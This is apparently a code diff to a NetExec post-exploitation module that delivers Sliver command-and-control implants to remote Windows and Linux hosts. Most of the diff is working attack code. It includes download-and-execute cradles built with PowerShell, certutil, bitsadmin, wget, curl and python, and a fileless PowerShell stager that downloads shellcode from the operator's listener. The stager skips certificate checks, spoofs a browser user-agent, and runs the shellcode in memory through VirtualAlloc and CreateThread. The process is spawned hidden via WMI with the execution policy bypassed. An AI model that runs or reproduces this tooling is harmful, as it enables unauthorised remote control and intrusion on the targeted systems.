@@ -20,11 +20,11 @@ def _import_protobuf():
     global SliverClientConfig, SliverClient, grpc, clientpb, rpcpb, rpc_grpc
     if 'SliverClientConfig' not in globals() or SliverClientConfig is None:
         try:
-            from sliver import SliverClientConfig, SliverClient
+            from sliver_client import SliverClientConfig, SliverClient
             import grpc
-            from sliver.pb.clientpb import client_pb2 as clientpb
-            from sliver.pb.rpcpb import services_pb2 as rpcpb
-            from sliver.pb.rpcpb import services_pb2_grpc as rpc_grpc
+            from sliver_client.pb.clientpb import client_pb2 as clientpb
+            from sliver_client.pb.rpcpb import services_pb2 as rpcpb
+            from sliver_client.pb.rpcpb import services_pb2_grpc as rpc_grpc
         except ImportError:
             raise ImportError("Sliver client not available. This module should be installed with its packaged protobuf bindings.")
 
@@ -156,11 +156,11 @@ class GrpcWorker:
         client = await self._do_connect(self.config_path)
         return await client.save_implant_profile(profile_pb)
 
-    async def _do_generate_implant(self, ic):
+    async def _do_generate_implant(self, ic, name):
         """Generate a Sliver implant from ImplantConfig."""
         client = await self._do_connect(self.config_path)
 
-        resp = await client.generate_implant(ic)
+        resp = await client.generate_implant(ic, name)
         if not resp.File or not resp.File.Data:
             raise ValueError(f"Failed to generate implant: {resp.Err or 'unknown'}")
         return resp
@@ -249,6 +249,56 @@ class GrpcWorker:
         """Get list of sessions."""
         client = await self._do_connect(self.config_path)
         return await client.sessions()
+
+    async def _do_website_add_content(self, website_name, path, content_type, content_bytes):
+        """Add content to a Sliver website."""
+        client = await self._do_connect(self.config_path)
+        _import_protobuf()
+        
+        content = clientpb.WebContent()
+        content.Path = path
+        content.ContentType = content_type
+        content.Content = content_bytes
+        
+        add_req = clientpb.WebsiteAddContent()
+        add_req.Name = website_name
+        add_req.Contents[path].CopyFrom(content)
+        
+        return await client._stub.WebsiteAddContent(add_req)
+
+    async def _do_website_remove(self, website_name):
+        """Remove a Sliver website."""
+        client = await self._do_connect(self.config_path)
+        _import_protobuf()
+        website_req = clientpb.Website()
+        website_req.Name = website_name
+        return await client._stub.WebsiteRemove(website_req)
+
+    async def _do_start_http_listener_with_website(self, host, port, website_name, secure=False):
+        """Start HTTP listener linked to a website."""
+        client = await self._do_connect(self.config_path)
+        _import_protobuf()
+        
+        req = clientpb.HTTPListenerReq()
+        req.Host = host
+        req.Port = port
+        req.Secure = secure
+        req.Website = website_name
+        
+        if secure:
+            resp = await client._stub.StartHTTPSListener(req)
+        else:
+            resp = await client._stub.StartHTTPListener(req)
+        return resp
+
+    async def _do_kill_job(self, job_id):
+        """Kill a running job/listener by ID."""
+        client = await self._do_connect(self.config_path)
+        _import_protobuf()
+        
+        kill_req = clientpb.KillJobReq()
+        kill_req.ID = job_id
+        return await client._stub.KillJob(kill_req)
 
     def shutdown(self):
         """Shutdown the worker thread."""
@@ -479,42 +529,59 @@ class WinRMHandler(ProtocolHandler):
         except Exception as e:
             context.log.warning(f"WinRM exec failed: {e}")
 
-    def _generate_encoded_loader(self, b64_stager):  # Remove http_url; no download in PS
-        """Minimal PS loader: Decompress and inject raw bootstrap shellcode."""
-        loader_ps = textwrap.dedent(f'''
-            $compressed = [Convert]::FromBase64String('{b64_stager}');
-            $ms = [System.IO.MemoryStream]::new();
-            $gzip = [System.IO.Compression.GZipStream]::new([System.IO.MemoryStream]::new($compressed), [System.IO.Compression.CompressionMode]::Decompress);
-            $gzip.CopyTo($ms);
-            $gzip.Close();
-            $code = $ms.ToArray();
-            Add-Type -TypeDefinition @"
-            using System; using System.Runtime.InteropServices;
-            public class Mem {{ [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
-            [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint c, IntPtr id); }}
-            "@
-            $addr = [Mem]::VirtualAlloc(0, $code.Length, (0x1000 -bor 0x2000), 0x40);
-            [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $addr, $code.Length);
-            [Mem]::CreateThread(0, 0, $addr, 0, 0, 0) | Out-Null;
-        ''')
-        return base64.b64encode(loader_ps.encode('utf-16-le')).decode('ascii')
-
     def stage_execute(self, context, connection, os_type, stager_data):
-        # No listener start here—done in _run_beacon
-        compressed = gzip.compress(stager_data)  # Compress tiny bootstrap
-        b64_stager = base64.b64encode(compressed).decode('ascii')
-        encoded_loader = self._generate_encoded_loader(b64_stager)
+        """Execute fileless bootstrap stager via WinRM.
         
-        total_size = len(encoded_loader)
+        This method executes the tiny PowerShell bootstrap (~2KB) that downloads
+        full shellcode (~17MB) from a Sliver stager listener and runs it in-memory.
+        
+        The bootstrap is encoded for PowerShell's -EncodedCommand parameter using
+        the standard encoding chain: UTF-8 → UTF-16LE → Base64
+        
+        Execution method:
+            - Uses WMI Win32_Process.Create to spawn detached PowerShell process
+            - Process runs hidden (-WindowStyle Hidden) with no execution policy
+            - Bootstrap downloads shellcode from stager listener
+            - Shellcode executes in-memory (VirtualAlloc + CreateThread)
+            - No disk writes (fully fileless)
+        
+        WinRM envelope limit:
+            WinRM has a 150KB message size limit. The bootstrap payload must stay
+            well under this limit. Typical bootstrap size: ~2-3KB encoded.
+        
+        Args:
+            context: NetExec context for logging
+            connection: NetExec WinRM connection object
+            os_type: Target OS (currently unused - retained for interface compatibility)
+            stager_data: Raw bootstrap bytes from _generate_sliver_stager() (UTF-8 encoded)
+        
+        Returns:
+            True if WMI spawn succeeded, False otherwise
+        """
+        # Decode raw UTF-8 bytes to PowerShell script string
+        bootstrap_ps = stager_data.decode('utf-8')
+        
+        # Encode for PowerShell -EncodedCommand parameter
+        # PowerShell expects: UTF-16LE + Base64 encoding
+        encoded_cmd = base64.b64encode(bootstrap_ps.encode('utf-16-le')).decode('ascii')
+        
+        total_size = len(encoded_cmd)
+        context.log.info(f"Bootstrap payload size: {total_size} bytes")
+        
+        # Verify payload size is under WinRM's 150KB envelope limit
+        # Typical bootstrap: ~2-3KB (well under limit)
         if total_size > 150 * 1024:
-            context.log.warning(f"Encoded loader size ({total_size} bytes) may exceed WinRM envelope")
-
-        wmi_cmd = f'''(Get-WmiObject -Class Win32_Process -List).Create('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_loader}') | Out-Null'''
+            context.log.fail(f"Bootstrap payload ({total_size} bytes) exceeds WinRM 150KB limit!")
+            return False
+        
+        # Execute bootstrap via WMI (detached process)
+        # This spawns powershell.exe with the encoded bootstrap command
+        wmi_cmd = f'''(Get-WmiObject -Class Win32_Process -List).Create('powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_cmd}') | Out-Null'''
         try:
             result = connection.ps_execute(wmi_cmd, get_output=True)
             if result and result.strip():
                 context.log.debug(f"WMI spawn output: {result}")
-            context.log.info("Bootstrap stager injected via detached in-memory WMI (HTTP fetch self-handled)")
+            context.log.info("Bootstrap stager injected (fileless download from stager listener)")
             return True
         except Exception as e:
             context.log.fail(f"WinRM stager exec failed: {e}")
@@ -659,7 +726,9 @@ class NXCModule:
         self.staging = False
         self.stager_rhost = None
         self.stager_rport = None
+        self.stager_port = None  # For HTTP staging
         self.stager_protocol = "http"
+        self.staging_method = "powershell"  # Windows: powershell, certutil, bitsadmin; Linux: wget, curl, python
         self.os_type = None
         self.arch = None
         self.share_config = None
@@ -687,7 +756,7 @@ class NXCModule:
         known_options = {
             "IMPLANT_BASE_PATH", "RHOST", "RPORT", "CLEANUP", "OS", "ARCH",
             "SHARE", "PROFILE", "WAIT", "FORMAT", "STAGING", "STAGER_RHOST", 
-            "STAGER_RPORT", "STAGER_PROTOCOL"
+            "STAGER_RPORT", "STAGER_PROTOCOL", "STAGER_PORT", "STAGING_METHOD"
         }
 
         # Check for unknown options
@@ -759,6 +828,24 @@ class NXCModule:
                     context.log.fail(f"STAGER_RPORT must be a valid port number (1-65535): {module_options['STAGER_RPORT']}")
                     sys.exit(1)
 
+            # Validate STAGER_PORT if provided
+            if module_options.get("STAGER_PORT"):
+                try:
+                    port = int(module_options["STAGER_PORT"])
+                    if not (1 <= port <= 65535):
+                        raise ValueError()
+                except (ValueError, TypeError):
+                    context.log.fail(f"STAGER_PORT must be a valid port number (1-65535): {module_options['STAGER_PORT']}")
+                    sys.exit(1)
+
+            # Validate STAGING_METHOD if provided
+            if module_options.get("STAGING_METHOD"):
+                staging_method = module_options.get("STAGING_METHOD", "powershell").lower()
+                valid_methods = ["powershell", "certutil", "bitsadmin", "wget", "curl", "python"]
+                if staging_method not in valid_methods:
+                    context.log.fail(f"STAGING_METHOD must be one of: {', '.join(valid_methods)} (default: powershell)")
+                    sys.exit(1)
+
     def _parse_module_options(self, context, module_options):
         """
         Parse all module options and set instance variables.
@@ -782,8 +869,14 @@ class NXCModule:
         if self.staging:
             self.stager_rhost = module_options.get("STAGER_RHOST", None)
             self.stager_rport = int(module_options["STAGER_RPORT"]) if "STAGER_RPORT" in module_options and module_options.get("STAGER_RPORT") is not None else None
-            self.stager_protocol = module_options.get("STAGER_PROTOCOL", "http").lower()
-            context.log.display(f"Stager listener: {self.stager_rhost}:{self.stager_rport} ({self.stager_protocol})")
+            stager_port_value = module_options.get("STAGER_PORT")
+            self.stager_port = int(stager_port_value) if stager_port_value is not None else 8080
+            stager_protocol_value = module_options.get("STAGER_PROTOCOL")
+            self.stager_protocol = stager_protocol_value.lower() if stager_protocol_value is not None else "http"
+            staging_method_value = module_options.get("STAGING_METHOD")
+            self.staging_method = staging_method_value.lower() if staging_method_value is not None else "powershell"
+            context.log.display(f"HTTP staging: {self.stager_rhost or self.rhost}:{self.stager_port}")
+            context.log.display(f"Staging method: {self.staging_method}")
             context.log.display(f"Final C2: {self.rhost}:{self.rport} (mTLS)")
         fmt = module_options.get("FORMAT", "exe").lower()
         if fmt not in ["exe", "executable"]:
@@ -943,41 +1036,55 @@ class NXCModule:
 
         try:
             full_remote_path = None
+            listener_job_id = None
+            website_name = None
+            
             if self.staging:
-                if protocol != "winrm":
-                    context.log.fail("Staging currently only supported on WinRM")
-                    sys.exit(1)
-                self.stage_port = self.rport  # Define if needed
-                # Ensure worker connected BEFORE any submits (fixes config_path=None in _do_connect)
-                _ = self._get_worker_and_connect()
-                
-                # Build profile for stage2 (defines profile_name; already has connect guard)
-                _, profile_name = self._build_ic_default(context, os_type, arch, implant_name) if not self.profile else self._build_ic_from_profile(context, os_type, arch, implant_name)
-                
-                # Gen bootstrap + prep stage2 (this also registers the stage)
-                self.stager_data = self._generate_sliver_stager(context, os_type, arch, implant_name, profile_name)
-                
-                # Now start stager listener with the profile name and stage data
-                self._worker_submit('start_stager_listener', 
-                                  self.stager_rhost or self.rhost, 
-                                  self.stager_rport or self.rport, 
-                                  self.stager_protocol,
-                                  profile_name,
-                                  self.stager_data)
-                context.log.info(f"Started {self.stager_protocol.upper()} stager listener on {self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}")
-                
-                # Now start mTLS listener for stage 2
-                self.mtls_port = self.rport  # Use RPORT for stage 2 mTLS
-                _ = self._get_worker_and_connect()  # Re-ensure for mTLS
-                self._worker_submit('start_mtls_listener', self.rhost, self.mtls_port)
-                context.log.info(f"Started mTLS C2 listener for stage 2 on {self.rhost}:{self.mtls_port}")
-                
-                success = handler.stage_execute(context, connection, os_type, self.stager_data)
-                if not success:
-                    context.log.fail("Stager execution failed")
-                    sys.exit(1)
-                context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.stager_protocol.upper()})")
-                full_remote_path = None  # In-memory; no cleanup needed
+                # Determine staging approach:
+                # - If STAGER_PORT is set, use HTTP download staging
+                # - Otherwise, use TCP/HTTP shellcode injection staging
+                if hasattr(self, 'stager_port') and self.stager_port:
+                    # HTTP download staging approach
+                    context.log.display(f"Using HTTP download staging ({self.staging_method})")
+                    full_remote_path, listener_job_id, website_name = self._run_beacon_staged_http(
+                        context, connection, os_type, arch, implant_name, handler
+                    )
+                else:
+                    # TCP/HTTP shellcode injection staging
+                    if protocol != "winrm":
+                        context.log.fail("Staging currently only supported on WinRM")
+                        sys.exit(1)
+                    self.stage_port = self.rport  # Define if needed
+                    # Ensure worker connected BEFORE any submits (fixes config_path=None in _do_connect)
+                    _ = self._get_worker_and_connect()
+                    
+                    # Build profile for stage2 (defines profile_name; already has connect guard)
+                    _, profile_name = self._build_ic_default(context, os_type, arch, implant_name) if not self.profile else self._build_ic_from_profile(context, os_type, arch, implant_name)
+                    
+                    # Gen bootstrap + prep stage2 (this also registers the stage)
+                    self.stager_data = self._generate_sliver_stager(context, os_type, arch, implant_name, profile_name)
+                    
+                    # Now start stager listener with the profile name and stage data
+                    self._worker_submit('start_stager_listener', 
+                                      self.stager_rhost or self.rhost, 
+                                      self.stager_rport or self.rport, 
+                                      self.stager_protocol,
+                                      profile_name,
+                                      self.stager_data)
+                    context.log.info(f"Started {self.stager_protocol.upper()} stager listener on {self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}")
+                    
+                    # Now start mTLS listener for stage 2
+                    self.mtls_port = self.rport  # Use RPORT for stage 2 mTLS
+                    _ = self._get_worker_and_connect()  # Re-ensure for mTLS
+                    self._worker_submit('start_mtls_listener', self.rhost, self.mtls_port)
+                    context.log.info(f"Started mTLS C2 listener for stage 2 on {self.rhost}:{self.mtls_port}")
+                    
+                    success = handler.stage_execute(context, connection, os_type, self.stager_data)
+                    if not success:
+                        context.log.fail("Stager execution failed")
+                        sys.exit(1)
+                    context.log.info(f"Stager executed on {host} via {protocol} (multi-stage {self.stager_protocol.upper()})")
+                    full_remote_path = None  # In-memory; no cleanup needed
             else:
                 ic = self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
                 implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
@@ -993,11 +1100,162 @@ class NXCModule:
                 context.log.display(f"Executing beacon at {full_remote_path}...")
                 handler.execute(context, connection, full_remote_path, os_type)
 
-            self._wait_for_beacon_and_cleanup(context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=self.cleanup and not self.staging)
+            self._wait_for_beacon_and_cleanup(context, connection, full_remote_path, os_type, implant_name, handler, protocol, 
+                                            cleanup=self.cleanup, 
+                                            listener_job_id=listener_job_id, 
+                                            website_name=website_name)
 
         finally:
             if not self.staging:
                 self._cleanup_local_temp(self.local_implant_path)
+
+    def _run_beacon_staged_http(self, context, connection, os_type, arch, implant_name, handler):
+        """
+        Execute beacon via HTTP download staging.
+        
+        This method:
+        1. Generates a full implant EXE
+        2. Creates a unique Sliver website and uploads the implant
+        3. Starts an HTTP listener linked to the website
+        4. Builds a small PowerShell download cradle (~200 bytes)
+        5. Executes the download cradle on the target
+        6. Waits for beacon check-in
+        7. Optionally cleans up the website and listener
+        
+        Args:
+            context: NetExec context object
+            connection: NetExec connection object
+            os_type: Target OS (windows/linux)
+            arch: Target architecture (amd64/386)
+            implant_name: Generated unique implant name
+            handler: Protocol handler instance
+        
+        Returns:
+            tuple: (full_remote_path, listener_job_id, website_name) for cleanup
+        """
+        host = connection.host
+        protocol = connection.__class__.__name__.lower()
+        
+        # 1. Generate full implant EXE
+        context.log.display(f"Generating implant for HTTP staging...")
+        ic = self._build_ic_from_profile(context, os_type, arch, implant_name)[0] if self.profile else self._build_ic_default(context, os_type, arch, implant_name)[0]
+        implant_data = self._generate_sliver_implant(context, os_type, arch, implant_name)
+        
+        # 2. Create unique website and upload implant
+        website_name = f"nxc_{secrets.token_hex(4)}"
+        implant_path = f"/{implant_name}"
+        
+        context.log.display(f"Uploading implant to Sliver website '{website_name}'...")
+        self._worker_submit('website_add_content', 
+                           website_name, 
+                           implant_path, 
+                           "application/octet-stream", 
+                           implant_data)
+        context.log.info(f"Implant uploaded to website (path: {implant_path})")
+        
+        # 3. Start HTTP listener with website
+        stager_host = self.stager_rhost or self.rhost
+        stager_port = self.stager_port
+        
+        context.log.display(f"Starting HTTP listener on {stager_host}:{stager_port}...")
+        listener_resp = self._worker_submit('start_http_listener_with_website',
+                                           stager_host,
+                                           stager_port,
+                                           website_name,
+                                           secure=False)
+        listener_job_id = listener_resp.JobID
+        context.log.info(f"HTTP listener started (Job ID: {listener_job_id})")
+        
+        # 4. Build download cradle based on OS type and staging method
+        download_url = f"http://{stager_host}:{stager_port}{implant_path}"
+        
+        # Determine if this is a Windows or Linux target
+        is_windows = os_type.lower() == "windows"
+        
+        if is_windows:
+            # Windows staging methods
+            if self.staging_method == "powershell":
+                # PowerShell Invoke-WebRequest download + execute
+                cmd = (
+                    f'powershell -ep bypass -w hidden -c '
+                    f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
+                    f'Start-Process $env:TEMP\\{implant_name}"'
+                )
+                context.log.debug(f"Using PowerShell staging method")
+            elif self.staging_method == "certutil":
+                # Certutil download + execute
+                cmd = (
+                    f'cmd /c certutil -urlcache -f {download_url} '
+                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
+                )
+                context.log.debug(f"Using certutil staging method")
+            elif self.staging_method == "bitsadmin":
+                # BITSAdmin download + execute
+                cmd = (
+                    f'cmd /c bitsadmin /transfer job /download /priority high '
+                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
+                )
+                context.log.debug(f"Using bitsadmin staging method")
+            else:
+                context.log.fail(f"Staging method '{self.staging_method}' not supported for Windows. Use: powershell, certutil, or bitsadmin")
+                sys.exit(1)
+        else:
+            # Linux staging methods
+            tmp_path = f"/tmp/{implant_name}"
+            
+            if self.staging_method == "wget":
+                # wget download + execute in background
+                cmd = (
+                    f'wget -q -O {tmp_path} {download_url} && '
+                    f'chmod +x {tmp_path} && '
+                    f'nohup {tmp_path} > /dev/null 2>&1 &'
+                )
+                context.log.debug(f"Using wget staging method")
+            elif self.staging_method == "curl":
+                # curl download + execute in background
+                cmd = (
+                    f'curl -s -o {tmp_path} {download_url} && '
+                    f'chmod +x {tmp_path} && '
+                    f'nohup {tmp_path} > /dev/null 2>&1 &'
+                )
+                context.log.debug(f"Using curl staging method")
+            elif self.staging_method == "python":
+                # Python urllib download + execute in background
+                cmd = (
+                    f'python3 -c "import urllib.request; '
+                    f'urllib.request.urlretrieve(\'{download_url}\', \'{tmp_path}\')" && '
+                    f'chmod +x {tmp_path} && '
+                    f'nohup {tmp_path} > /dev/null 2>&1 &'
+                )
+                context.log.debug(f"Using python staging method")
+            else:
+                context.log.fail(f"Staging method '{self.staging_method}' not supported for Linux. Use: wget, curl, or python")
+                sys.exit(1)
+        
+        context.log.info(f"Payload size: {len(cmd)} bytes")
+        
+        # 5. Execute on target
+        context.log.display(f"Executing download cradle on {host} via {protocol}...")
+        
+        if protocol == "winrm":
+            # For WinRM, use ps_execute if it's a PowerShell command
+            if self.staging_method == "powershell":
+                # Execute the PowerShell portion directly
+                inner_ps = f"IWR '{download_url}' -OutFile $env:TEMP\\{implant_name}; Start-Process $env:TEMP\\{implant_name}"
+                result = connection.ps_execute(inner_ps, get_output=True)
+                if result and result.strip():
+                    context.log.debug(f"PowerShell output: {result}")
+            else:
+                # For certutil/bitsadmin, use regular execute
+                connection.execute(cmd)
+        else:
+            # For other protocols, use handler's execute method
+            handler.execute(context, connection, cmd, os_type)
+        
+        context.log.info(f"Download cradle executed on {host}")
+        
+        # Return cleanup info (will be handled by caller)
+        return None, listener_job_id, website_name
 
     def _detect_os_arch(self, context, connection):
         """
@@ -1082,7 +1340,6 @@ class NXCModule:
         """
         _import_protobuf()
         ic = clientpb.ImplantConfig()
-        ic.Name = implant_name
         ic.GOOS = os_type
         ic.GOARCH = arch
         ic.Format = clientpb.OutputFormat.Value(self.format)
@@ -1091,6 +1348,7 @@ class NXCModule:
         ic.BeaconJitter = 3 * 1_000_000_000   # 3s in ns
         ic.Debug = False
         ic.ObfuscateSymbols = True
+        ic.HTTPC2ConfigName = "default"  # Required for Sliver v1.6+
         if os_type == "windows":
             ic.Evasion = True
 
@@ -1116,7 +1374,6 @@ class NXCModule:
         _import_protobuf()
         ic_local = clientpb.ImplantConfig()
         ic_local.CopyFrom(profile_pb.Config)
-        ic_local.Name = implant_name
         ic_local.GOOS = os_type
         ic_local.GOARCH = arch
         ic_local.Format = clientpb.OutputFormat.Value(self.format)
@@ -1192,7 +1449,7 @@ class NXCModule:
 
             # Generate implant
             context.log.display(f"Generating Sliver {os_type}/{arch} {self.format.lower()}...")
-            resp = self._worker_submit('generate_implant', ic)
+            resp = self._worker_submit('generate_implant', ic, implant_name)
             context.log.info("Implant generated")
             context.log.debug(f"Implant generated is ({len(resp.File.Data)} bytes)")            
             return resp.File.Data
@@ -1201,51 +1458,157 @@ class NXCModule:
             sys.exit(1)
 
     def _generate_sliver_stager(self, context, os_type, arch, implant_name, profile_name):
+        """Generate tiny bootstrap stager for fileless shellcode staging.
+        
+        This implements a two-stage shellcode delivery mechanism to bypass WinRM's
+        150KB message size limit:
+        
+        Stage 1 (Bootstrap - ~2KB):
+            - Tiny PowerShell script generated by this method
+            - Downloads Stage 2 from Sliver stager listener via HTTP
+            - Executes Stage 2 in-memory using VirtualAlloc + CreateThread
+        
+        Stage 2 (Full Shellcode - ~17MB):
+            - Generated as Sliver shellcode implant with mTLS C2
+            - Registered on Sliver's stager listener (HTTP/HTTPS/TCP)
+            - Downloaded by Stage 1 bootstrap at runtime
+        
+        The bootstrap payload (~2KB) is 6,250x smaller than sending full shellcode
+        directly, ensuring WinRM compatibility.
+        
+        Workflow:
+            1. Generate full Stage 2 shellcode (~17MB) with mTLS C2 callback
+            2. Save Stage 2 as Sliver profile/build for serving
+            3. Register Stage 2 on Sliver's stager listener (makes it downloadable)
+            4. Generate tiny PowerShell bootstrap that downloads from stager URL
+            5. Return bootstrap bytes to caller for WinRM execution
+        
+        Args:
+            context: NetExec context for logging
+            os_type: Target OS ('windows' or 'linux')
+            arch: Target architecture ('amd64' or '386')
+            implant_name: Unique implant identifier
+            profile_name: Sliver profile name (currently unused - may be removed)
+        
+        Returns:
+            Raw bootstrap bytes (UTF-8 encoded PowerShell script)
+            Caller must encode for PowerShell -EncodedCommand (UTF-16LE + base64)
+        """
         try:
             _ = self._get_worker_and_connect()
-            context.log.info("Generating HTTP bootstrap stager...")
-            # Build Stage 2 IC with mTLS C2
+            context.log.info("Generating tiny HTTP bootstrap stager...")
+            
+            # Build Stage 2 implant config with mTLS C2 callback
             ic_stage2 = self._build_default_implant_config(os_type, arch, implant_name, f"mtls://{self.rhost}:{self.rport}")
-            ic_stage2.Format = 1  # SHELLCODE
-            ic_stage2.Evasion = False
-            ic_stage2.ObfuscateSymbols = False
-            stage2_resp = self._worker_submit('generate_shellcode', ic_stage2)  # Gen stage2 shellcode
+            _import_protobuf()
+            ic_stage2.Format = clientpb.OutputFormat.SHELLCODE
+            ic_stage2.Evasion = False  # Disable evasion for shellcode format
+            ic_stage2.ObfuscateSymbols = False  # Disable obfuscation for faster generation
+            
+            # Generate full Stage 2 shellcode (~17MB) - too large for WinRM direct delivery
+            stage2_resp = self._worker_submit('generate_shellcode', ic_stage2)
             if not stage2_resp.File or not stage2_resp.File.Data:
                 raise ValueError("Stage 2 shellcode gen failed")
-
-            # Save stage2 as profile/build
-            _import_protobuf()
+            context.log.debug(f"Stage 2 shellcode generated ({len(stage2_resp.File.Data)} bytes)")
+ 
+            # Save Stage 2 as Sliver profile/build to make it serveable by stager listener
             stage2_profile_name = f"nxc_stage2_{secrets.token_hex(4)}"
             stage2_pb = clientpb.ImplantProfile()
             stage2_pb.Name = stage2_profile_name
             stage2_pb.Config.CopyFrom(ic_stage2)
             saved_stage2 = self._worker_submit('save_implant_profile', stage2_pb)
-            build_id = saved_stage2.Name  # Use profile name as build ID
-
-            # Gen tiny Stage 1 bootstrap (msfvenom HTTP reverse)
-            req = clientpb.GenerateStageReq()
-            req.Build = build_id  # Stage 2 build
-            req.Lhost = self.stager_rhost
-            req.Lport = self.stager_rport
-            req.OS = os_type.upper()
-            req.Arch = arch.upper()
-            req.Format = "raw"  # Raw shellcode
-            req.Protocol = "http"  # HTTP bootstrap
-            resp = self._worker_submit('generate_stage', req)  # Now passes full req
-            if not resp.File or not resp.File.Data:
-                raise ValueError("Bootstrap stager gen failed")
-            
-            context.log.info(f"Bootstrap stager generated ({len(resp.File.Data)} bytes)")
-
-            # Register stage2 on listener (after start in _run_beacon)
+            build_id = saved_stage2.Name  # Profile name doubles as build ID
+            context.log.debug(f"Stage 2 saved as profile/build: {build_id}")
+ 
+            # Register Stage 2 on stager listener to make it downloadable
+            # This tells Sliver: "When GET /<stage2_profile_name> is requested, serve this shellcode"
             stage_req = clientpb.ImplantStageReq()
             stage_req.Build.append(build_id)
-            self._worker_submit('stage_implant_build', stage_req)  # Pass full req
+            self._worker_submit('stage_implant_build', stage_req)
+            context.log.debug(f"Stage 2 registered on listener")
             
-            return resp.File.Data  # Tiny bootstrap only
+            # Construct download URL for bootstrap based on stager protocol
+            # Bootstrap will fetch Stage 2 from this URL at runtime
+            if self.stager_protocol == "http":
+                stage_url = f"http://{self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}/{stage2_profile_name}"
+            elif self.stager_protocol == "https":
+                stage_url = f"https://{self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}/{stage2_profile_name}"
+            else:
+                stage_url = f"tcp://{self.stager_rhost or self.rhost}:{self.stager_rport or self.rport}/{stage2_profile_name}"
+            
+            context.log.debug(f"Stage URL: {stage_url}")
+            
+            # Generate tiny PowerShell bootstrap that downloads Stage 2 from stager URL
+            bootstrap_ps = self._generate_http_download_bootstrap(stage_url, os_type)
+            
+            # Return raw UTF-8 bytes (caller will encode for PowerShell -EncodedCommand)
+            bootstrap_bytes = bootstrap_ps.encode('utf-8')
+            context.log.info(f"Bootstrap stager generated ({len(bootstrap_bytes)} bytes raw)")
+            return bootstrap_bytes
         except Exception as e:
             context.log.fail(f"Stager gen failed: {e}")
             raise
+
+    def _generate_http_download_bootstrap(self, stage_url, os_type):
+        """Generate tiny HTTP downloader bootstrap for Sliver stager.
+        
+        This creates a minimal PowerShell script (~2KB) that downloads full shellcode
+        from a Sliver stager listener and executes it in-memory. The small payload size
+        ensures compatibility with WinRM's 150KB envelope limit.
+        
+        The bootstrap performs three operations:
+            1. Downloads shellcode (~17MB) from stager URL via HTTP
+            2. Allocates RWX memory with VirtualAlloc
+            3. Executes shellcode in-memory with CreateThread
+            
+        Security considerations:
+            - Uses TLS 1.2 for encrypted transport
+            - Disables certificate validation (required for self-signed C2 certs)
+            - Mimics browser User-Agent for traffic blending
+            - Executes entirely in-memory (no disk writes)
+        
+        Args:
+            stage_url: HTTP/HTTPS URL where shellcode is hosted by Sliver stager listener
+                      Format: http://10.0.0.1:8080/nxc_stage2_abc123
+            os_type: Target OS type (currently only 'windows' supported)
+        
+        Returns:
+            PowerShell script as string (not encoded - caller handles encoding chain)
+        """
+        if os_type == "windows":
+            # PowerShell bootstrap for in-memory shellcode execution
+            download_ps = f'''
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+$ProgressPreference = 'SilentlyContinue';
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
+
+# Download shellcode from stager listener
+$wc = New-Object System.Net.WebClient;
+$wc.Headers.Add('User-Agent', 'Mozilla/5.0');
+$bytes = $wc.DownloadData('{stage_url}');
+$wc.Dispose();
+
+# Allocate RWX memory for shellcode execution
+# Memory flags: 0x1000 = MEM_COMMIT, 0x2000 = MEM_RESERVE
+# Protection: 0x40 = PAGE_EXECUTE_READWRITE
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Mem {{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint c, IntPtr id);
+}}
+"@;
+
+$addr = [Mem]::VirtualAlloc(0, $bytes.Length, (0x1000 -bor 0x2000), 0x40);
+[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length);
+[Mem]::CreateThread(0, 0, $addr, 0, 0, 0);
+'''
+            return download_ps
+        else:
+            raise ValueError(f"OS type {os_type} not supported for bootstrap stager")
 
     def _save_implant_to_temp(self, implant_data):
         """
@@ -1257,10 +1620,22 @@ class NXCModule:
         tmp_file.close()
         return tmp_file.name
 
-    def _wait_for_beacon_and_cleanup(self, context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=True):
+    def _wait_for_beacon_and_cleanup(self, context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=True, listener_job_id=None, website_name=None):
         """
         Wait for beacon via Sliver polling, then optionally cleanup using handler cmd.
         Falls back to timeout if polling fails.
+        
+        Args:
+            context: NetExec context
+            connection: NetExec connection
+            full_remote_path: Path to remote implant file (None for in-memory staging)
+            os_type: Target OS
+            implant_name: Generated implant name
+            handler: Protocol handler
+            protocol: Protocol name
+            cleanup: Whether to cleanup
+            listener_job_id: HTTP listener job ID to kill (for HTTP staging cleanup)
+            website_name: Sliver website name to remove (for HTTP staging cleanup)
         """
 
         if not self._wait_for_beacon(context, implant_name, timeout=self.wait_seconds):
@@ -1269,22 +1644,40 @@ class NXCModule:
             else:
                 context.log.display("Beacon not detected within timeout")
 
-        if cleanup and full_remote_path:  # Skip if staging (no file)
-            # Cleanup remote file
-            cleanup_cmd = handler.get_cleanup_cmd(full_remote_path, os_type)
-            method = self._get_exec_method(protocol)
-            try:
-                if protocol == "winrm":
-                    result = connection.ps_execute(cleanup_cmd, get_output=True)
-                    if result and result.strip():
-                        context.log.debug(f"PowerShell cleanup output: {result}")
-                else:
